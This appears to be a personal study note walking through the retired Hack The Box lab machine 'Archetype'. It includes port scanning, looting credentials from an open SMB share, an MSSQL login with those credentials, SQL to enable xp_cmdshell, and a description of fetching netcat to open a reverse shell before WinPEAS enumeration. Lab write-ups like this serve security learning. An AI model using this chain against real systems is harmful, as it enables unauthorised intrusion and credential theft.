---
tags: [archive, hackthebox, mssql, windows, privesc]
platform: Hack The Box
tier: "2"
status: archived
---

# Archetype

- TCP port hosting a database server: `nmap -sC -sV -sT 10.129.103.181` -> `1433` (MSSQL)
- Non-administrative SMB share: `smbclient -N --list=10.129.103.181`
- Password found in a file on that share:
  ```bash
  smbclient -N \\\\10.129.103.181\\backups
  ls
  get prod.dtsConfig
  ```
- Impacket script for an authenticated MSSQL connection: `mssqlclient.py`
- Extended stored procedure to spawn a Windows command shell: `xp_cmdshell`
- Tool to search for Windows privilege-escalation paths: WinPEAS
- File containing the administrator's password: found by running WinPEAS, which first requires a shell.

## Enabling xp_cmdshell and getting a shell

```bash
python ./mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.103.181 -windows-auth
```
`xp_cmdshell` is disabled by default, enable it:
```sql
EXEC sp_configure 'show advanced option', 1;
RECONFIGURE;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
To get an interactive shell, host `nc64.exe` (from the well-known `int0x33/nc.exe` repository) on a local web server (`sudo python3 -m http.server 80`), fetch it onto the target via `xp_cmdshell`, and use it to connect back to a listener on the attacker machine. From there, run WinPEAS to find the administrator's password.

## Why
This is a privilege-escalation chain built from a sequence of trust boundaries each handing over more access. A world-readable backup config file leaks a service account's credentials, that account has rights to enable a disabled SQL Server feature (`xp_cmdshell`) that grants OS command execution. From there standard Windows privilege-escalation enumeration (WinPEAS) finds a stored administrator credential. See [[File Upload Vulnerabilities and Privilege Escalation]] for the general principle that landing a foothold is rarely the end goal, the next step is almost always finding what that foothold's account can access or run that a normal user couldn't.
